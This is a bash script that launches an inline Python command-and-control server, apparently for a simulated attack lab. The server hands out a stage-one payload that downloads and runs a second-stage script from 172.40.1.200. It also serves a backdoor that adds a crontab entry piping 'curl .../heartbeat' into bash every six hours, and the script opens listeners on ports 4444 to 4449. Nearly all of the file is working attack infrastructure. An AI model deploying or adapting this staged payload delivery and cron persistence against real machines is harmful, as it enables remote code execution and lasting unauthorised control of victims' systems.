#!/bin/bash

echo "Attacker C2 starting..."

python3 -c "
import http.server
import socketserver
import threading
import time

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"status\":\"received\",\"next_action\":\"continue\"}')
    
    def do_GET(self):
        if self.path.endswith('.sh') or self.path.endswith('.py'):
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            if 'stage1' in self.path:
                payload = '''#!/bin/bash
echo \"Stage 1 payload executing...\"
wget -O /tmp/stage2.py http://172.40.1.200:8080/payload/stage2.py
python3 /tmp/stage2.py &
echo \"Stage 1 complete\"'''
            else:
                payload = '''#!/bin/bash
echo \"Backdoor installation\"
crontab -l > /tmp/cron_backup
echo \"0 */6 * * * curl -s http://172.40.1.200:8080/heartbeat | bash\" >> /tmp/cron_backup
crontab /tmp/cron_backup'''
            self.wfile.write(payload.encode())
        else:
            self.send_response(404)
            self.end_headers()

def start_c2_server():
    with socketserver.TCPServer(('', 8080), C2Handler) as httpd:
        httpd.serve_forever()

def start_listeners():
    import socket
    ports = [4444, 4445, 4446, 4447, 4448, 4449]
    for port in ports:
        def listen_on_port(p):
            try:
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind(('', p))
                server_socket.listen(5)
                while True:
                    client_socket, addr = server_socket.accept()
                    data = client_socket.recv(8192)
                    client_socket.close()
            except:
                pass
        thread = threading.Thread(target=lambda: listen_on_port(port))
        thread.daemon = True
        thread.start()

c2_thread = threading.Thread(target=start_c2_server)
c2_thread.daemon = True
c2_thread.start()

listener_thread = threading.Thread(target=start_listeners)
listener_thread.daemon = True
listener_thread.start()

time.sleep(3600)
"
